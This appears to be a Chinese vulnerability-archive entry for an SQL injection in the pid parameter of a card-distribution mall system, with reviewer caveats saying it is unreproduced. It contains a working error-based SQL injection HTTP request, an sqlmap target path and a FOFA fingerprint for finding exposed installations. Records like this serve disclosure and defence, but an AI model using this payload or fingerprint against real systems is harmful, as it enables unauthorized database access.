---
source: "wy876 漏洞文库"
title: "号卡极团分销商城 order/index pid SQL注入"
product: "号卡极团分销商城"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "MySQL GTID_SUBSET；版本未知"
prerequisites: "无Cookie示例，身份待核"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/yyyq138u9iev4ton"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%8D%A1%E5%8F%B7%E6%9E%81%E5%9B%A2%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E5%8D%A1%E5%8F%B7%E6%9E%81%E5%9B%A2%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Forder%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "icon_hash=\"-795291075\""
fofa_unverified: "icon_hash="
id: "vw-bc1e6d284b84d7e73e131bc1"
entity_id: "ve-bc1e6d284b84d7e73e131bc1"
schema_version: "1"
---

# 号卡极团分销商城 order/index pid SQL注入

## 条目说明

- 对象与具体问题：号卡极团分销商城；order/index pid SQL注入
- 版本、配置及部署条件：MySQL GTID_SUBSET；版本未知
- 认证与权限前提：无Cookie示例，身份待核
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 标题卡号与简介号卡倒序，需确立厂商正式名
- qjjqq1qbxkq仅孤立标记，需完整GTID错误响应，获取数据库权限说法过宽
- 工具仅基准URL无输出；补影响版本/修复/源码

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
号卡极团分销商城管理系统,同步对接多平台,同步订单信息,支持敢探号一键上架,卡号极团管理系统order存在SQL注入漏洞，攻击者获取数据库权限。

## 二、影响版本
+ 卡号极团管理系统

## 三、资产测绘
+ fofa`icon_hash="-795291075"`
+ 特征


## 四、漏洞复现
```http
GET /order/index.php?pid=1%27+AND+GTID_SUBSET%28CONCAT%280x716a6a7171%2C%28SELECT+%28ELT%287046%3D7046%2C1%29%29%29%2C0x7162786b71%29%2C7046%29--+NqPh HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```


```plain
qjjqq1qbxkq
```

sqlmap

```plain
/order/index.php?pid=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yyyq138u9iev4ton>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
